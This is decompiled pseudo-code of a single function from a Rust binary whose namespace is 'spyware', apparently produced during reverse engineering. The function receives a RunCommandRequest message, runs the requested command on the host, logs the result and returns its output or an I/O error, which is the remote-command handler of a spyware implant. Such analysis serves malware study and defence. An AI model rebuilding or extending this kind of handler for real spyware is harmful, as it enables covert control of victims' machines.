
  int128_t* spyware::actions::commands::run_command_message::h528f548903eb1e39(int128_t* arg1, int64_t* arg2)

{
    char const* const var_c8;
    char const (** const var_88)[0x86];
    int64_t** var_78;
    int64_t* var_58;
    int64_t* var_38;
    
    if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4)
    {
        var_38 = arg2;
        var_58 = &var_38;
        int64_t (* var_50_1)(int64_t* arg1, int64_t* arg2) =
            _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h5f99fd476a35f039;
        var_88 = &data_4ba0b8;
        int64_t var_80_1 = 2;
        int64_t var_68_1 = 0;
        var_78 = &var_58;
        int64_t var_70_1 = 1;
        int64_t rax_1 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4ba0f8);
        var_c8 = "spyware::actions::commands";
        int64_t var_c0_1 = 0x1a;
        char const* const var_b8_1 = "spyware::actions::commands";
        int64_t var_b0_1 = 0x1a;
        int64_t var_a8_1 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_88, 4, &var_c8);
    }
    
    arg2[2];
    spyware::actions::commands::run_command::ha7c0eb7cdcbdbc69(&var_38, arg2[1]);
    int64_t** var_98;
    
    if (!(0 + -(var_38)))
    {
        var_58 = var_38;
        
        if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4)
        {
            var_98 = &var_58;
            int64_t (* var_90_1)(void* arg1, int64_t* arg2) = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
            var_88 = &data_4ba0d8;
            int64_t var_80_3 = 1;
            int64_t var_68_3 = 0;
            int64_t*** var_78_1 = &var_98;
            int64_t var_70_3 = 1;
            int64_t rax_10 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4ba110);
            var_c8 = "spyware::actions::commands";
            int64_t var_c0_3 = 0x1a;
            char const* const var_b8_4 = "spyware::actions::commands";
            int64_t var_b0_3 = 0x1a;
            int64_t var_a8_3 = rax_10;
            log::__private_api::log::h13afddf373bd7d7f(&var_88, 4, &var_c8);
        }
        
        int64_t var_28;
        arg1[1] = var_28;
        *arg1 = var_58;
        *(arg1 + 0x18) = -0x8000000000000000;
    }
    else
    {
        int64_t** var_30;
        var_98 = var_30;
        
        if (core::sync::atomic::atomic_load::h8c88032dab18ab12())
        {
            var_58 = &var_98;
            int64_t (* var_50_2)(int64_t* arg1, int64_t* arg2) = _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
            var_88 = &data_4ba0e8;
            int64_t var_80_2 = 1;
            int64_t var_68_2 = 0;
            var_78 = &var_58;
            int64_t var_70_2 = 1;
            int64_t rax_4 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4ba128);
            var_c8 = "spyware::actions::commands";
            int64_t var_c0_2 = 0x1a;
            char const* const var_b8_2 = "spyware::actions::commands";
            int64_t var_b0_2 = 0x1a;
            int64_t var_a8_2 = rax_4;
            log::__private_api::log::h13afddf373bd7d7f(&var_88, 1, &var_c8);
        }
        
        int64_t rdx_4 =
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4bd00d1297ead281(
            &var_88);
        var_c8 = var_88;
        std::io::error::repr_bitpacked::decode_repr::h049ae64b4e643a43(&var_88, var_98);
        char r15_1 = var_88;
        int32_t rbp_1 = *var_88[4];
        _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h89fbb585ce883e17(
            &var_88, &var_98, rdx_4);
        *(arg1 + 0x28) = var_78;
        *(arg1 + 0x18) = var_88;
        arg1[1] = var_78;
        *arg1 = var_c8;
        arg1[3] = (0 - 0) | rbp_1;
        core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(var_98);
    }
    core::ptr::drop_in_place$LT$spyware..communication..messages..RunCommandRequest$GT$::he0afe8a5e2188792(arg2);
    return arg1;
}
